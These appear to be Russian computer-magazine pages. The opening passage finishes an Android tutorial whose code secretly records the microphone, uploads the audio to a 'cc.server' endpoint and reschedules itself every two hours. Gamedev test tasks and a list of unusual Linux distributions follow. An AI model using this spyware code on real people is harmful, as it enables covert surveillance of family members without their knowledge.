// Запись должна вестись с микрофона, в формате 3GP, алгоритм
кодирования звука AMR_NB
myAudioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
myAudioRecorder.
    setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
myAudioRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);

Согласно документации, метод, вызванный BroadcastReceiver’ом, будет рабо-
тать не дольше десяти секунд, после чего принудительно остановится систе-
мой. Для продолжительной записи нужно запускать отдельный поток с помо-
щью класса Service. Что мы и сделаем!

Intent audioIntent = new Intent(context, AudioService.class);
context.startService(audioIntent);

При запуске сервиса выполнится метод onHandleIntent, который и будет запи-
сывать звук с микрофона.

public class AudioService extends IntentService {
    @Override
    protected void onHandleIntent(Intent intent) {
        recordAudio();
    }
    ...
}

Скидывать данные в Сеть удобнее всего обычным POST-запросом. В этом нам
поможет класс HttpUrlConnection, рассмотрим основные моменты.

FileInputStream fileInputStream =
    new FileInputStream(new File(myFile) );
URL myUrl = new URL("http://cc.server/upload.php");
HttpURLConnection connection =
    (HttpURLConnection) myUrl.openConnection();
connection.setDoInput(true);
connection.setDoOutput(true);
connection.setUseCaches(false);
// Инициализируем POST-запрос
connection.setRequestMethod("POST");
connection.setRequestProperty("Connection", "Keep-Alive");
connection.setRequestProperty("Content-Type",
    "multipart/form-data;boundary=" + boundary);
// Открываем соединение с сервером и кидаем по нему файл
outputStream = new DataOutputStream(connection.getOutputStream());
outputStream.writeBytes(twoHyphens + boundary + lineEnd);
// Описываем содержимое запроса согласно RFC 1806
outputStream.writeBytes(
    "Content-Disposition: form-data; name=\"uploadedfile\";filename=\""
    + myFile + "\"" + lineEnd);
outputStream.writeBytes(lineEnd);
bytesAvailable = fileInputStream.available();
bufferSize = Math.min(bytesAvailable, maxBufferSize);
buffer = new byte[bufferSize];
// Считываем в буфер файл, одновременно фиксируя размер прочитанного
bytesRead = fileInputStream.read(buffer, 0, bufferSize);
while (bytesRead > 0)
{
    outputStream.write(buffer, 0, bufferSize);
    bytesAvailable = fileInputStream.available();
    bufferSize = Math.min(bytesAvailable, maxBufferSize);
    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
}
outputStream.writeBytes(lineEnd);
outputStream.writeBytes(twoHyphens + boundary + twoHyphens
    + lineEnd);





Рис. 2. Загруженные на сервер файлы

Чтобы все заработало, нам нужно зарегистрироваться на получение систем-
ных событий. Класс AlarmManager предоставляет возможность запланировать
запуск нашего приложения в определенный момент времени. Выбор большой,
мы остановимся на возможности запуска каждые два часа. Об остальном ты
самостоятельно прочитаешь в официальной документации.

Intent intentConfig = new Intent(this, ConfigUpdater.class);
PendingIntent pIConfig = PendingIntent.getBroadcast(
    this.getApplicationContext(), 31337, intentConfig, 0);
AlarmManager aMConfig =
    (AlarmManager) getSystemService(ALARM_SERVICE);
// Приложение будет запускаться с настоящего момента каждые два часа
aMConfig.setRepeating(AlarmManager.RTC_WAKEUP,
    System.currentTimeMillis(), 7200000, pIConfig);

Для полноценной работы приложения нужно еще немного модифицировать
файл AndroidManifest. Приложение должно получить разрешение у ОС на все те
действия, которые необходимы для выполнения задуманного: запись файлов,
доступ к Сети, фотографирование, запись звука и реагирование на системные
события. При установке приложения ОС предупредит пользователя обо всех
этих нюансах (кроме системных событий), вот почему всегда нужно вниматель-
но смотреть, какие разрешения ты даешь программе. Если пасьянс «Косынка»
просит доступ к камере, возможно, он не только пасьянс?

ЗАКЛЮЧЕНИЕ
Итак, у нас все получилось! Теперь можно спокойно отпускать свое чадо (су-
пругу, кота) и в пир и в мир. Главное — предупредить, что все записывается и
протоколируется. Ведь мы против вмешательства в частную жизнь других лю-
дей без их ведома.

                                                                          Рис. 3. Коммерческое
                                                                приложение схожего
                                                                    функционала. Как
                                                                  видишь, можно
                                                                     сделать и самому





                                   WWW

                                                                                 Рассказ
                                                                        об Activity lifecycle
                                                                              из первых уст

                                                                   Хороший обучающий
                                                                        материал по основам
                                                                                       Android


В статье мы остановились на ключевых моментах, а на нашем сайте есть бо-
лее подробный исходный код созданной программы. Наша главная задача —
пробудить у тебя интерес к безопасности устройств на базе Android, поэтому
выложенные исходники мы чуть-чуть обрезали. Если что-то осталось непонят-
ным — обязательно пиши мне на почту. Удачи и душевого спокойствия!
Кодинг





                                         Олег Парамонов
                                Юрий «yurembo» Язев
                                                   yazevsoft@gmail.com,
                                                        yazevsoft.blogspot.ru
  ЗАДАЧИ
     НА СОБЕСЕДОВАНИЯХ



           СПЕЦВЫПУСК
     ТЕСТОВЫЕ ЗАДАНИЯ В GAMEDEV,
               ЧАСТЬ 2





Несколько месяцев назад я уже делился частью сво-
ей коллекции тестовых заданий, которые ставят пе-
ред соискателями на позицию программиста в ин-
дустрии gamedev. И надо сказать, получил неплохой
фидбэк! Вижу, что разработка игр серьезно интере-
сует нашего читателя, и не только потому, что в игро-
вой индустрии можно заработать неплохие деньги.
Похоже, что для этой области народного хозяйства
более чем актуальна мудрость, приписываемая Кон-
фуцию: «Выберите себе работу по душе, и вам не
придется работать ни одного дня».

ТЕСТОВОЕ ЗАДАНИЕ: АНАЛОГ КЛАССИЧЕСКОЙ ИГРЫ
ASTEROIDS (КОМПАНИЯ «КЕФИР!»)
Задача: разработать клон игры Asteroids. Вкратце: Asteroids настолько древ-
няя игра, что она даже старше меня — седовласого игродела. Классический
Asteroids был разработан в 1979 году в компании Atari для игровых автоматов.

Предмет тестового задания
Игровой мир представляет собой часть космоса, в которой пользователь
управляет космическим кораблем, смотря на него сверху. Корабль перемеща-
ется в области экрана, не выходя за его пределы (сталкиваясь с границами при
их достижении). В сцене присутствуют также дрейфующие астероиды и кос-
мические тарелки. Первые имеют разнообразный в определенных пределах
размер, кроме того, они могут перемещаться в любом направлении с различ-
ной (в разумных границах) скоростью. При столкновении с астероидами кос-
мический корабль взрывается (или погибает, кому как больше нравится). По-
сле своего появления в игровой сцене летающие тарелки всегда преследуют
космический корабль и если догоняют, то уничтожают его. Это описание боле-
е-менее классической части, объединяющей все клоны Asteroids.
   Итак, по заданию, кроме всего перечисленного, надо добавить такие вещи.
У космического корабля есть два вида оружия: пули и лазер. Запас пуль бес-
конечен. С их помощью НЛО можно подбить одним выстрелом, а если ими по-
пасть по астероиду, то он раскалывается на два меньших куска, продолжающих
дрейфовать в космическом пространстве с произвольно выбранной скоростью
и направлением. Эти части полноценного астероида при следующем попада-
нии уничтожаются с первого раза.
   Второй тип оружия — лазер. Он должен иметь лимит на количество выстре-
лов: изначально у корабля есть десять лазерных выстрелов. Когда игрок их ис-
тратит, запас лазерного оружия медленно восполняется. С помощью лазера
и астероиды, и летающие тарелки уничтожаются с одного попадания.
  Каждый астероид сталкивается друг с другом и соответственно меняет на-
правление движения.
  В игре надо реализовать специальные эффекты (particle effects), служащие
для визуализации различных взрывов.
  Все это имеет отношение к геймплею. Кроме этого, надо реализовать ма-
ло-мальский GUI. В него должны входить в качестве HUD’а: текстовые надписи,
показывающие набранные очки, которые увеличиваются в момент поражения
астероидов и тарелок, и количество лазерных снарядов (самовосстанавлива-
ющееся значение).
   Когда геймерский корабль терпит крушение, надо вывести окно, в котором
будет показано количество набранных очков, и предоставить игроку выбор
между началом игры заново и выходом, то есть закрытием приложения.

Техническая часть тестового задания
Можно использовать любой доступный игровой движок на свой выбор. Арт ком-
пания не выдает, следовательно, весь контент для игры нужно нарисовать са-
мому или, на худой конец, использовать свободный.





Оригинальный Asteroids 1979 года

ТЕСТОВОЕ ЗАДАНИЕ: КРЕСТИКИ-НОЛИКИ
(КОМПАНИЯ DIGITAL UNIVERSE)
Крестики-нолики на Unreal Engine 4 (адское пекло,
стрельба по воробьям из пушки) — это тестовое
задание в компании Digital Universe. В общем-то,
из этого предложения все понятно. Дополнительно
надо разработать простенький искусственный ин-
теллект. Пусть, например (не имеет принципиальной
разницы), игрок ходит за крестики, а ИИ — за ноли-
ки. Хотя арт не выдается, смоделить крестик и нолик
в том же Blender — не проблема. Еще надо добавить
меню, которое появляется в случае победы одной                                                      Крестики-нолики
из сторон или ничьей (бессмысленное продолже-
ние игры — невозможность хода), имеющее две кнопки: New Game, Quit. Со-
ответственно, нажатие первой кнопки перезапускает игру, второй — закрывает
приложение.
   Обрати внимание, что используемый движок строго определен. Но после
того, как в начале года Unreal Engine 4 стал абсолютно бесплатным (впрочем,
и раньше его можно было свободно использовать в любительских проектах),
это перестало быть проблемой.

ТЕСТОВОЕ ЗАДАНИЕ: АНАЛОГ ИГРЫ «ПУЗЫРИ»
(КОМПАНИЯ PLAYRIX)
В целом «Пузыри» выглядят следующим образом. В двумерном пространстве
имеется изначально заданное количество точек, каждая из которых движет-
ся по игровому полю хаотично (в любом направлении, с любой скоростью —
в разумных пределах), при этом они не сталкиваются, но отскакивают от границ
окна приложения. Когда игрок щелкает по игровому полю мышью, то место, где
был сделан клик, становится центром растущего круга. Вырастая до заданного
предела за условный период, круг определенное время остается с максималь-
ным радиусом, а потом начинает быстро уменьшаться. Достигнув минимально-
го размера, он исчезает. В течение всего времени, пока круг виден на экране,
точки, соприкоснувшиеся с ним, удаляются, а на их местах появляются такие же
раздувающиеся круги, которые живут по идентичному алгоритму. Игрок может
создавать новые круги, пока на игровом поле присутствует хотя бы одна окруж-
ность. В момент, когда исчезает последний круг, игра завершается. И тогда
должно появиться модальное окошко, в котором надо отобразить общее чис-
ло точек, а также количество удаленных. Одновременно при появлении этого
меню должна быть возможность перезапуска игры с начала.
   Это общее представление игры «Пузыри». Описанное тестовое задание
предлагается компанией Playrix. Для его выполнения компания выдает соб-
ственный движок вместе с документацией, чтобы соискателю было что поку-
рить. Вдобавок, кроме движка, выдается редактор эффектов (EffectEditor, тоже
с документацией). EffectEditor поставляется с несколькими эффектами и тек-
стурами, чтобы соискателю можно было разобраться, что в этом редакторе к
чему. Поскольку визуальные эффекты повышают привлекательность игры, при
проверке задания внимание будет уделено не только коду (применению ООП
и используемым алгоритмам). Имея общее представления об игре «Пузыри»,
программист должен сам развить идею, выбрать арт и создать по этой механи-
ке по-другому выглядящую игру. Кроме того, выдается две заготовки, соответ-
ственно, для Visual Studio 2008 и VS 2012, одну из которых следует использо-
вать для начала разработки своей игры, в зависимости от используемой версии
студии. Предлагаемая заготовка включает пример вывода текстуры, которая
перемещается вместе с курсором мыши и двумя простыми particle-эффектами,
созданными в EffectEditor, один из которых следует за мышью, а второй запу-
скается по щелчку правой кнопкой мыши.
   После того как игра будет соответствовать описанной выше механике (кру-
ги будут создаваться, расти, уменьшаться, исчезать, точки — перемещаться и
соударяться с окружностями, чтобы самоуничтожиться и породить новый круг),
в игру надо будет добавить два particle-эффекта. Первый эффект должен пред-
ставлять собой шлейф, следующий за каждой точкой. Он должен существовать
на протяжении всей жизни точки и уничтожаться в момент смерти родительской
точки, то есть при ее соприкосновении с кругом. Таким образом, количество
экземпляров эффекта-шлейфа равно количеству точек. Второй эффект должен
представлять собой взрыв или вспышку, которая происходит в момент стол-
кновения точки с кругом. То есть этот эффект визуально подчеркивает событие
коллизии. Оба эффекта необходимо создать самостоятельно в EffectEditor.
   Исходные значения (количество точек, присутствующих на экране и участву-
ющих в физическом взаимодействии; период, за который родившийся круг до-
стигает своего максимального размера; время, которое круг висит на экране,
достигнув лимита на размер) считываются в начале выполнения игры из файла
input.txt.
   Для полноты картины надо добавить надпись, отображающую количество
набранных очков (например, «Score: X», где X обозначает очки), а также всплы-
вающие при уничтожении точки надписи, которые показывают полученный бо-
нус (после появления они должны быстро увеличиваться, а затем так же быстро
уменьшаться).
   Техническая часть тестового задания. Поскольку движок написан на C++, то
дорабатывать шаблон тебе предстоит на этом замечательном языке. Игровой
движок содержит поддержку всех необходимых либ, следовательно, включает
всю нужную функциональность для загрузки изображений и particle effects, так
что изобретать колесо тебе не придется.

ТЕСТОВОЕ ЗАДАНИЕ «ФЕЙЕРВЕРК» (ФИРМА PLAYRIX)
Суть этого тестового задания заключается в разработке фейерверка с зада-
ваемым уровнем вложенности. Уровень вложенности здесь означает число
распадов и взрывов, которое порождается изначально выпущенным зарядом.
Когда пользователь щелкает левой кнопкой мыши в области окна приложения,
в данных координатах должен быть создан фейерверк. Он выглядит следую-
щим образом: из стартовых координат вверх вылетает начальный заряд, через
некоторое время он взрывается и распадается на заданное количество дочер-
них зарядов, которые разлетаются в разные стороны. Каждый дочерний заряд
повторяет судьбу материнского заряда, которым был порожден. Число таких
итераций определяется уровнем вложенности. Необходимо сделать возмож-
ность одновременного запуска нескольких фейерверков, каждый из которых
выполняется по описанному алгоритму.
   Для выполнения тестового задания (разработки приложения фейерверка)
компания выдает свой движок вместе с документацией и редактором эффек-
тов EffectEditor, тоже включающим документацию и примеры.
   Поведение фейерверка (полет зарядов, их взрывы-распады, создание но-
вых зарядов, генерация эффектов) реализуется в коде. Для выполнения задания
дается шаблон, включающий вывод текстуры и реализацию эффекта и предна-
значенный для разных версий студии (выбирается по желанию).
   После того как описанная основа будет готова, надо прикрутить пару
particle-эффектов, которые тебе предстоит создать в EffectEditor (программа
несколько странная, но вполне рабочая и со своими обязанностями справ-
ляется). Первый эффект представляет собой шлейф, следующий за зарядом.
Этот эффект необходимо прикреплять к каждому заряду, в том числе дочер-
нему. Второй эффект должен возникать в момент распада заряда, например
он может представлять собой взрыв. Этот эффект может быть одним на все
случаи жизни, но лучше, если для распадов на разных уровнях будет свой осо-
бенный эффект. Не забывай, что оценивается не только качество кода, умение
использовать ООП и паттерны проектирования, но и визуальная составляющая
твоей игры!
   Приложение «Фейерверк» содержит заранее определенные значения, ко-
торые надо прочитать из файла в начале работы программы. Это количество
уровней вложенности фейерверка и число частиц, на которое распадается за-
ряд при взрыве.
   Техническая составляющая точно такая же, как в предыдущем задании.





Фейерверк

ТЕСТОВОЕ ЗАДАНИЕ: АНАЛОГ ИГРЫ «ТИР»
(КОМПАНИЯ PLAYRIX)
Как в двух прошлых случаях, для выполнения тестового компания выдает свой
движок, написанный на C++. В нем очень активно используется boost и множе-
ство других библиотек.
   Игра «Тир» выглядит примерно следующим образом. По игровому полю ха-
отично движется любое (заданное изначально) количество мишеней. Для раз-
нообразия они могут быть представлены любыми предметами. Мишени долж-
ны перемещаться с рандомной скоростью в случайных направлениях. В нижней
части игрового поля по центру расположена пушка (или любое другое стреляю-
щее устройство — что подскажет твоя бурная фантазия). Она должна изменять
угол выстрела (направление дула) в направлении координат курсора мыши.
В момент, когда игрок нажимает левую кнопку мыши, из дула пушки вылетает
снаряд и следует по вектору, заданному углом поворота пушки. Снаряд должен
лететь достаточно быстро. Интересной идеей будет добавить внешние силы,
влияющие на отклонение снаряда от начальной траектории: например, ими
могут служить порывы ветра, если пушка наземная, или течение, если действия
игры разворачиваются под водой. Когда объект-мишень поражен выпущенным
пушкой снарядом, он уничтожается и исчезает. Главная задача юзера — под-
бить как можно больше мишеней. На это отводится ограниченное и заранее
определенное количество времени. Когда время истечет или будут подбиты
все мишени, должно появиться окно, в котором необходимо отобразить общее
количество мишеней и число сбитых. Кроме того, здесь же должна предлагать-
ся возможность перезапустить уровень игры с восстановлением всех объектов
и их начальных значений.
   Когда алгоритм для игры будет реализован (то есть игра будет работать как
надо), для добавления зрелищности необходимо в EffectEditor создать пару
эффектов и приаттачить их к игре. Первый эффект должен представлять собой
шлейф, идущий за снарядом и пропадающий в момент поражения им мишени
(данный эффект создается для каждого снаряда). Второй эффект визуализи-
рует момент попадания снаряда по мишени, другими словами, представляет
собой взрыв.
  При загрузке игры из текстового файла считываются следующие начальные
значения: число мишеней, которые присутствуют в игре в начале, скорость сна-
ряда и длительность игры. Эти сведения можно записать в файл в виде «имя
значения = число», например так: TotalTime = 60. Таким образом, длительность
игры должна составить 60 с.
   Техническая составляющая задания точно такая же, как у двух предыдущих.

ТЕСТОВОЕ ЗАДАНИЕ: РАЗРАБОТАТЬ ИГРУ —
ПОДОБИЕ НАСТОЛЬНОЙ MANCALA
Чего только не придумают игроделы, чтобы вынести мозг программистам-со-
искателям! В наших краях Mancala мало известна, однако кое-где за рубежом,
особенно в восточных странах, эта настольная игра, отдаленно напоминаю-
щая нарды, очень популярна. Соискателю предлагается воплотить ее в цифре.
К слову, цифровая версия популярна на Западе. В данном случае компания
выдает весь арт, который будет использоваться в процессе разработки игры.
Это уже радует. В целом его очень много: не только статические изображения
доски, лунок и кристаллов, но и последовательности активных изображений —
анимации.
   Как и в нардах, для игры в манкалу используется специальная доска. И на
этом, пожалуй, сходство между играми заканчивается. Существует много раз-
новидностей манкалы, в данном конкретном случае надо разработать магиче-
скую манкалу, в которой можно применять заклинания. Правила таковы. В игре
принимают участие два игрока. На доске для манкалы расположены десять ак-
тивных ячеек: два ряда по пять ячеек, у каждого игрока свой ряд. Дополнитель-
но справа от основных ячеек игрока находится прямоугольное углубление —
калах, куда попадают выигранные кристаллы, но об этом чуть позже. В начале
игры (в соответствии с заданием) в каждую ячейку помещаются по четыре кри-
сталла. Участники ходят по очереди. Игрок щелкает на одной из своих ячеек,
из нее забираются все кристаллы и плавно раскладываются по одному по со-
седним ячейкам в направлении против часовой стрелки. Полет и раскладыва-
ние кристаллов надо запрограммировать. Кроме того, надо учитывать, сколько
кристаллов находится в каждой ячейке, и выводить это количество рядом с ней.
В калах так же, как в ячейку, помещается один кристалл, затем кристаллы рас-
кладываются в ячейки противоположной стороны, вражеский калах пропуска-
ется. Когда все кристаллы из ячейки разложены, право хода переходит к оппо-
ненту. Однако, если последний кристалл попадает в калах, право хода остается
у текущего игрока. Если последний кристалл игрока попадает в пустую ячейку
его ряда, то из противоположной ячейки оппонента забираются все кристаллы
и вместе со своим кристаллом переносятся в калах. Цель игры — поместить в
свой калах больше кристаллов, чем соперник. Количество кристаллов в калахе
тоже должно отображаться на игровом поле.
   Игра заканчивается, когда какая-то из сторон не может сделать хода. Кри-
сталлы в калахах подсчитываются, сравниваются, и на экран выводится сооб-
щение о выигрыше или проигрыше.
   Также необходимо реализовать простенький ИИ, умеющий делать ходы
и использовать магические заклинания. От тебя не требуется разработать про-
гнозирующую машину, но твой ИИ должен зарабатывать кристаллы.
   Дополнительно к стандартным правилам в магической манкале необходи-
мо реализовать заклинания, для которых выдаются статические изображения
и последовательности картинок для создания анимаций. Заклинания должны
быть представлены в виде картинок рядом с игровой доской; для их примене-
ния должна быть возможность перетаскивать их на любую ячейку, как свою, так
и противника. На использование магии тратится мана, которая должна воспол-
няться после успешных ходов игрока. Использование магии считается за ход.
Надо реализовать четыре вида заклинаний: огонь, заморозка, молния, теле-
порт, каждая со своей анимацией и последствиями исполнения. Использова-
ние огня уничтожает в ячейке один кристалл; заморозка замораживает на один
ход один или два кристалла (то есть их нельзя выбрать); молния уничтожает от
нуля до двух кристаллов; с помощью телепорта можно переместить один кри-
сталл из выбранной ячейки в любую другую.
  В заключение нужно добавить GUI пользователя: окошки для вывода сведе-
ний о победе и проигрыше и для вывода информации, кто делает следующий
ход. Когда ход делает ИИ, все ячейки должны быть заблокированы.
  Во многом это тестовое задание предлагается для того, чтобы работода-
тель понял, насколько быстро программист может разобраться в новой для
себя предметной области. Конечно, будут учитываться и способности алгорит-
мизации, и выбор подходящей технологии (движка), так как средства программ-
ной реализации остаются на усмотрение соискателя.





Настольная (аналоговая) Mancala

           ПОБЕДИТЕЛЬ
           ОТ КОМПАНИИ CUSTIS

                 Славим Виктора Святоху из Хабаровска, успешно ре-
                 шившего все задания!



ЗАКЛЮЧЕНИЕ
Несмотря на кризис, игровая индустрия все еще на подъеме. Нужны новые со-
трудники, с новым взглядом на вещи, с новым мировоззрением. Тем не менее
отбор довольно суров. Поэтому надо тщательно подготовиться как к собесе-
дованию, так и к выполнению тестового задания; нужно быть эрудированным
в широком спектре вопросов и технологий. Сегодня мы описали шесть тесто-
вых заданий, предлагаемых соискателю на позицию программиста в игровой
индустрии. Это поможет тебе быть в курсе заданий, предоставляемых игровы-
ми студиями, а также повысить свой программерский левел.
  В одном из следующих номеров мы обязательно рассмотрим решение ка-
кой-то из задачек. Так что до встречи на страницах ][!

   IT-КОМПАНИИ, ШЛИТЕ НАМ СВОИ ЗАДАЧКИ!

    Миссия этой мини-рубрики — образовательная, поэтому мы бес-
    платно публикуем качественные задачки, которые различные компа-
    нии предлагают соискателям. Вы шлете задачки на lozovsky@glc.ru —
   мы их публикуем. Никаких актов, договоров, экспертиз и отчетностей.
    Читателям — задачки, решателям — подарки, вам — респект от на-
    шей многосоттысячной аудитории, пиарщикам — строчки отчетности
    по публикациям в топовом компьютерном журнале.
Unixoid

СБОРНАЯ
СОЛЯНКА ТОП-10 НЕОБЫЧНЫХ LINUX-ДИСТРИБУТИВОВ,
  КОТОРЫМИ ТЫ ВРЯД ЛИ ВОСПОЛЬЗУЕШЬСЯ
           В ОБЫЧНОЙ ЖИЗНИ





                                      Роман Ярыженко
                                               rommanio@yandex.ru




Помимо обычных дистрибутивов Linux, существует
еще и экзотика, которая, в общем-то, по функцио-
нальности ничем не отличается от нормальных дис-
трибутивов, но порой имеет некоторые интересные
особенности. Эту экзотику мы и разберем — не все
же время нужно писать о серьезных вещах.

STALI
Начнем с относительно неэкзотического дистрибутива. Stali — полностью ста-
тически собранный дистрибутив. По заверениям разработчиков, использова-
ние статической компиляции сильно уменьшает размер итоговых бинарников
и повышает производительность (по меньшей мере сокращается время запу-
ска, из-за того что разрешение символов при динамической линковке отнима-
ет некоторое количество ресурсов). Так, при линковке обычного «Hello, world»
с glibc размер исполняемого файла составляет 600 Кбайт. При линковке же
с uClibc его размер окажется примерно 7 Кбайт. Аналогично при динамической
линковке ksh c glibc размер образа будет 234 Кбайт, а при статической — 170
Кбайт.
  Кроме того, статическая линковка позволяет включить в приложение только
те символы, в которых есть необходимость. В случае же динамической линков-
ки о таком говорить бессмысленно.
   Вместо autoconf/autotools используется порт утилиты mk из Plan9 —
autoconf/autotools порой избыточно сложны, mk же предлагает разумный ком-
промисс между гибкостью и сложностью.
  К сожалению, ISO-образ не предоставляется, а сам дистрибутив датирован
2010 годом (несмотря на то что некоторые изменения вносятся и по сей день),
таким образом, можно сказать, что он до сих пор в стадии альфа, когда будет
выпущен первый релиз — неизвестно.

MULINUX
Дистрибутив для очень старых машин на основе 386-го процессора. Основан
он на ядре 2.0.36 — хотя во времена последнего выпуска (2004) уже, кажется,
было ядро не только 2.4, но и 2.6. Помимо ядра, на CD (около 70 Мбайт) влезло
еще много чего, в том числе X11 с fvwm95 и AfterStep, Netscape, Emacs, Lyx...
Есть также и несколько языков — русского, однако, там нет, ибо на тот момент
его поддержка в Linux была очень ограниченной.
  При запуске придется немного повозиться, дистрибутив содержит крайне ста-
рый софт, и для настройки нужно быть довольно-таки опытным пользователем.

                                                                        MuLinux:
                                                                    версия ядра
                                                                и список
                                                                    процессов





   MuLinux поставляется в виде ISO-образа, а также в виде набора файлов,
из которых можно собрать дискету (или несколько дискет). Кроме того, имеет-
ся возможность поставить дистрибутив на FAT с помощью UMSDOS — драйве-
ра, позволяющего использовать семантику UNIX на данной ФС (сейчас не под-
держивается).
  К сожалению, на 8 Мбайт памяти вскоре начинало выдавать Out of memory
и затем Bus error. На 16 все стало нормально, но при запуске X-сервера опять
происходило то же самое. Поэтому для реального использования на старом
компьютере потребуется как минимум раздел подкачки.
  В целом дистрибутив вызывает ностальгические ощущения. Но вместо него
можно использовать практически любой дистрибутив 1998 года.

UBUNTU SATANIC EDITION
Интересуешься демонологией и сатанизмом? Linux есть и для тебя! Ubuntu
satanic edition, основанный на Ubuntu 10.10, выглядит так, будто вышел прями-
ком из врат Ада: огненный фон рабочего стола, слегка измененная тема (дабы
придать мрачности) и даже некоторое количество тяжелой музыки. Фон рабо-
чего стола там не один, так что выбрать есть из чего.


                                                                       Так выглядит
                                                                   сатанинский
                                                                    Ubuntu





  Но при попытке найти хоть самую завалящую программу для астрологиче-
ских подсчетов (или там подсчета мощности эгрегора) обрадовавшегося было
сатаниста ждет большой облом. Их в составе дистрибутива нет — по всей ви-
димости, из-за козней католической церкви.
   Если говорить серьезно, то назвать это дистрибутивом у меня не поворачи-
вается язык. Нововведений по сравнению с оригинальным Ubuntu практически
нет — не считать же, в самом деле, добавление картинок с музыкой и смену
темы за существенные и приводящие к созданию нового дистрибутива измене-
ния? В принципе, достаточно было создать пакет с картинками, музыкой и из-
мененной темой. Правда, разработчики сами признаются, что они не привнес-
ли ничего нового.


                                                                Проигрывание
                                                                  демонической
                                                               музыки





   У Ubuntu satanic edition еще один минус: он старый. Хотя в чем проблема вы-
пустить новую версию — непонятно; есть предположение, что не выпускается
она из-за того, что разработчикам не нравится Unity.

GOBOLINUX
А это довольно занятный дистрибутив, идея которого заключается в том, что-
бы отказаться от стандартного дерева каталогов. Здесь оно выглядит совсем
по-другому. Так, все программы размещаются в каталоге /Programs, данные —
в каталоге /Data, точки монтирования — в /Mount, каталоги пользователя — в /
Users, всяческие системные вещи — в каталоге /System. Все. В корневом ка-
талоге больше никаких каталогов нет. Конфигурационные файлы же находят-
ся в /System/Settings. При этом при попытке доступа к какому-нибудь катало-
гу из старого дерева программно перенаправляет в соответствующий каталог
нового.

                                                                   Корневой
                                                                         каталог
                                                                        GoboLinux





   Сборка дистрибутива идет при помощи ALFS и собственной песочницы,
ChrootCompile, — в ней собирается практически все, кроме некоторых паке-
тов, таких, например, как Firefox и LibreOffice.
   Установщик очень и очень интуитивный, единственный минус — разбивать
жесткий диск на разделы приходится не в нем самом, а c использованием
Gparted, который нужно запускать перед запуском установщика.

                                                      В качестве GUI
                                                                    используется
                                                                         Enlightment





   Дистрибутив кажется очень интересным, однако слишком экзотичным. Слу-
чись что — и неопытный пользователь, который с внутренним устройством Linux
знаком лишь понаслышке, будет тыкаться в непривычное ему дерево каталогов
как слепой котенок. Да и сертификацию LSB он явно не пройдет. Так что дис-
трибутив этот, скорее, именно что для любителей экзотики.

МСВС И МСВСФЕРА
Дистрибутив Вооруженных сил РФ, разработанный во ВНИИС. Теоретически,
помимо платформы Intel, работает и на платформе «Эльбрус» (читай: Sparc).
В ранних версиях (до МСВСфера) имелась также своя система мандатного
контроля доступа (на модели Белла — Лападулы), сейчас же там самый обыч-
ный SELinux. МСВС сертифицирована всевозможными организациями, в том
числе по второму уровню контроля НДВ (а значит, довольно стара). МСВСфера
сертифицирована всего-навсего по ОУД2. Во времена МСВС был свой рабо-
чий стол на основе ELK, темой оформления до ужаса напоминавший Windows.
В самых же ранних версиях, по слухам, вместо кнопок «ОК» и «Отмена» были
кнопки «Есть» и «Отставить». Сейчас это самый обычный RHEL, подвергшийся
ребрендингу.
   Однако, несмотря на все эти вещи, некоторые разработчики прямо-та-
ки плюются: система, по их утверждениям, разработана настолько криво, что
для нее просто невозможно писать ПО. Кроме того, по их словам, эта самая
сертификация по сути фиктивна, так как проверяют на соответствие сертифи-
кационным требованиям сами разработчики и эти проверки от реальных экс-
плуатационных условий, мягко скажем, отличаются.
  Идея дистрибутива (МСВС), возможно, хороша, но российские реалии на-
кладывают свой отпечаток. Даже если предположить, что сертификация соот-
ветствует реальным условиям эксплуатации, для военных система все равно
избыточно сложна. Об этом говорит хотя бы тот факт, что в одном армейском
подразделении единственной защитой компьютера с МСВС служила табличка
«Совершенно секретно» на мониторе. Все остальные средства на данном ком-
пьютере отключены. МСВСфера же ничем не отличается от RHEL, но для рабо-
ты со сведениями, составляющими государственную тайну, несмотря на схо-
жесть названий с предшественником, не предназначена, и вопрос, почему эти
названия настолько похожи, остается открытым.

DAMN VULNERABLE LINUX
Этот дистрибутив — рай для начинающих пентестеров. Все пакеты, входящие
в него, уязвимы. Разработал его Торстен Шнайдер, преподаватель с факуль-
тета технологий Билефельдского университета (Германия). По его словам,
что в дистрибутиве оставлено «все, чего не должно быть в хорошей Linux-си-
стеме: устаревшее, неправильно настроенное и „ориентированное на взлом“
ПО (Apache, MySQL, PHP, FTP- и SSH-серверы)». Помимо этого, в состав
дистрибутива входит ПО для реверса и анализа проблем, которое, по идее,
не должно быть уязвимым.
   Дистрибутив основан на Slax, и в его состав входит следующее ПО (список
неполон):
•  ядро 2.6.20;
•  glibc 2.3.6;
• MySQL 5.0.24;
•  OpenSSH 4.4;
•  Samba 3.0.44a.

К сожалению, последний релиз данного дистрибутива был в начале 2009 года,
и сейчас он в некоторых аспектах устарел. Но в качестве учебной цели он
по-прежнему годится.

LINUXCNC
Этот дистрибутив предназначен для управления ЧПУ-станками, такими как то-
карные станки и мельницы. Он предоставляет:
•  несколько графических интерфейсов для управления, в том числе один сен-
   сорный;
•  интерпретатор G-code — стандартного языка программирования промыш-
   ленных машин;
•  систему управления обработкой материалов реального времени;
•  оперирование низкоуровневыми элементами промышленных машин (таки-
  ми как датчики и двигатели);
•  макетный слой для создания собственной конфигурации;
•  программный ПЛК с многозвенными диаграммами.

В LinuxCNC используется RT-ядро. Кроме того, есть HAL — его не нужно путать
с тем HAL, на смену которому пришел udev. Каждый компонент в HAL представ-
лен «черным ящиком» с ножками, каждая из которых обладает такими свойства-
ми, как тип ножки и тип сигнала. Существуют также «псевдоножки» — константы
параметров компонентов.

                                                                    Утилита
                                                                   настройки
                                                          CNC





   Дистрибутив крайне интересный, но очень узкоспециализированный. По-
рог вхождения большой, соответственно, обычному пользователю он будет
малополезен. Тем не менее, если интересно, что собой вообще представляет
управление промышленными комплексами (а также в том маловероятном слу-
чае, если у тебя такой станок имеется), — взглянуть на него стоит.

RED STAR OS
Как явствует из названия, это дистрибутив одной из немногих оставшихся соци-
алистических стран — Северной Кореи. Основан он на каком-то из RH-произ-
водных дистрибутивов (ядро 2.6.38), поскольку в качестве менеджера пакетов
используется RPM. Интерфейс фактически скопирован у OS X, но, по некото-
рым данным, не совсем удачно. При установке требуется ввести серийный но-
мер. Пользователь root по умолчанию отключен, однако из-за прорех в безо-
пасности (а именно правил udev, доступных всем на запись) его без проблем
